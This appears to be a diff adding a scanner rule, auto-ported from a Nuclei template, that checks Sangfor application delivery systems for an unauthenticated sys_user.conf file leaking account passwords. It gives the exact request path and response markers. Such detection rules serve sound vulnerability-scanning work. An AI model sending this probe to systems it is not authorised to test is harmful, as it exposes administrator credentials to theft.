@@ -1,0 +1,33 @@
+schema_version: 1
+id: "cortex.community:sangfor-sysuser-conf"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Sangfor Application sys_user.conf Account Password Leakage"
+  description: "Sangfor application delivery management system file sys_user.conf can be directly accessed without authorization, resulting in leakage of account and password Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20sys_user.conf%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
+    - "https://github.com/achuna33/MYExploit/blob/master/src/main/java/com/achuna33/Controllers/SangForController.java"
+  tags: ["lfi", "sangfor", "exposure", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/tmp/updateme/sinfor/ad/sys/sys_user.conf" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "true" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "admin" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "密码" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<?xml version=" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
